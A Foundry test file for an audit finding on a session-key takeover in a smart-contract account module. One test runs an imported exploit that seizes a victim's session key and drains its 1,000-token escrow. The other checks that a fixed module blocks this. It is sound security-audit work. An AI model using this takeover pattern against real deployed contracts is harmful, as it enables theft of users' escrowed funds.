// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import {
    CredibleAccountModuleFixed,
    Exploit,
    ISessionModule,
    Token,
    Victim
} from "./61404-c-02-unauthorized-session-key-takeover-via-missing-ownership.sol";

contract Finding61404Test is Test {
    function test_exploit_attacker_claims_victim_escrow() public {
        Exploit e = new Exploit();
        e.run();

        assertEq(e.ownerAfter(), address(e), "attacker is the recorded owner");
        assertEq(e.claimed(), 1_000 ether, "claim paid N");
        assertEq(e.token().balanceOf(address(this)), 1_000 ether, "caller received N");
        assertEq(e.token().balanceOf(address(e.victim())), 0, "victim lost the deposit");
        assertEq(e.token().balanceOf(address(e.module())), 0, "escrow was paid out");
        assertEq(e.N(), 1_000 ether, "harm magnitude");
    }

    function test_control_requires_the_owner() public {
        Token token = new Token();
        CredibleAccountModuleFixed module = new CredibleAccountModuleFixed();
        Victim victim = new Victim();
        address sessionKey = address(0x4444444444444444444444444444444444444444);
        uint256 n = 1_000 ether;

        token.mint(address(victim), n);
        victim.openSession(ISessionModule(address(module)), token, sessionKey, n);
        assertEq(module.sessionKeyToWallet(sessionKey), address(victim), "victim is owner");

        vm.expectRevert(abi.encodeWithSelector(CredibleAccountModuleFixed.SessionKeyOwned.selector, sessionKey));
        module.enableSessionKey(sessionKey, 1, 1_900_000_000, address(token), 0);

        vm.expectRevert(CredibleAccountModuleFixed.NotOwner.selector);
        module.claim(sessionKey, address(token));

        assertEq(token.balanceOf(address(module)), n, "escrow stays");
        assertEq(token.balanceOf(address(this)), 0, "attacker received nothing");

        vm.prank(address(victim));
        uint256 paid = module.claim(sessionKey, address(token));
        assertEq(paid, n, "only the owner can claim");
        assertEq(token.balanceOf(address(victim)), n, "victim recovered the escrow");
    }
}
